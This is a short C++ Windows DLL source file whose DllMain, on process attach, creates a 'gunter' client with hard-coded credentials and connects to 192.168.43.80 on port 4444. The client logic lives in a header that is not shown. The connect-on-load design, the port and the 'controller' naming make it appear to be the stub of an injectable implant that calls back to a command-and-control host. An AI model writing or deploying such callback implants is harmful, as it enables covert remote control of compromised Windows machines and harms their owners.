#include <windows.h>
#include <iostream>
#include "controller/client.hpp"  // Include your header file

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        std::cout << "DLL successfully attached! Running client...\n";

        credentials_t creds({
            "192.168.43.80",
            "gunter",
            "org",
            4444,
            10
        });

        std::cout << "Gunter instance created.\n";

        gunter_client_t client(creds);
        client.connect();

        break;
    }
    case DLL_PROCESS_DETACH:
        std::cout << "DLL detached!\n";
        break;
    }
    return TRUE;
}

